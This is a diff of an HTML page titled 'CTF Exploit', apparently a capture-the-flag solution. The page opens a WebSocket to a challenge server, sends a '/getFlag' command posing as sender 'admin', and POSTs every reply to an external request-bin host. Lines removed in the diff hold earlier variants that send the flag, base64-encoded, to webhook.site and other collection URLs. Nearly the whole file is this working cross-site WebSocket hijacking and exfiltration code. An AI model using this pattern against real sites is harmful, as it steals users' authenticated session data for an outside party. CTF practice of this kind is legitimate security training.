@@ -1,77 +1,23 @@
+<!DOCTYPE html>
 <html>
-
-<head>
-  <title>Document</title>
-  <!-- <script src="https://webhook.site/a80c813f-7fdc-4a90-bad0-00ee94384cfd/test.js"></script> -->
-</head>
-
+<head><title>CTF Exploit</title></head>
 <body>
+<script>
+  const socket = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
 
-  <script>
-    const socket = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
+  socket.onopen = () => {
+    // Gửi lệnh lấy flag
+    socket.send(JSON.stringify({ message: '/getFlag', sender: 'admin' }));
+  };
 
-    socket.onopen = () => {
-      // Gửi lệnh lấy flag
-      socket.send(JSON.stringify({ message: '/getFlag', sender: 'admin' }));
-    };
-
-    socket.onmessage = (event) => {
-      // Khi nhận dữ liệu từ server, gửi về RequestBin
-      fetch('https://bxzuehx.request.dreamhack.games/', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ data: event.data })
-      });
-    };
-
-    // fetch('http://server.dottak.me')
-    // fetch('https://jhzwstm.request.dreamhack.games')
-
-    // const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
-    // // ws.onopen = function () {
-    // //   setTimeout(() => {
-    // //     ws.send(JSON.stringify({ message: '/getFlag' }));
-    // //   }, 1000);
-    // // };
-    // ws.onopen = function () {
-    //   console.log('WebSocket connection established');
-    //   // Request the flag
-    //   ws.send(JSON.stringify({
-    //     message: '/getFlag'
-    //   }));
-    // };
-
-    // ws.onmessage = function (event) {
-    //   const data = JSON.parse(event.data);
-    //   fetch('https://jhzwstm.request.dreamhack.games/log?data=' + data.message)
-
-    //   if (data.message.includes('Flag:')) {
-    //     const flag = data.message;
-    //     fetch('https://jhzwstm.request.dreamhack.games/flag?data=' + flag)
-    //   }
-    // };
-
-    // ws.onerror = function (error) {
-    //   fetch('https://jhzwstm.request.dreamhack.games/error?error=' + error)
-    // };
-
-    // ws.onclose = function (e) {
-    //   // fetch('https://jhzwstm.request.dreamhack.games/close')
-    //   fetch(`https://jhzwstm.request.dreamhack.games/close?code=${e.code}&reason=${encodeURIComponent(e.reason)}`)
-    // };
-
-    // ws.addEventListener('open', () => {
-    //   ws.send(JSON.stringify({ message: '/getFlag' }));
-    // });
-
-    // /* ---------- 2. 플래그 수신 → 외부 서버로 전송 ---------- */
-    // function exfil(tag, data) {
-    //   const payload = encodeURIComponent(btoa(data));      // base64 → URL-safe
-    //   fetch(`https://webhook.site/a80c813f-7fdc-4a90-bad0-00ee94384cfd/?${tag}=${payload}`).catch(() => { });
-    // }
-    // ws.addEventListener('message', ev => exfil('flag', encodeURIComponent(ev.data)));
-    // ws.addEventListener('error', ev => exfil('error', encodeURIComponent(ev.message) || 'ws_error'));
-  </script>
+  socket.onmessage = (event) => {
+    // Khi nhận dữ liệu từ server, gửi về RequestBin
+    fetch('https://vvabyyk.request.dreamhack.games/', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ data: event.data })
+    });
+  };
+</script>
 </body>
-
 </html>
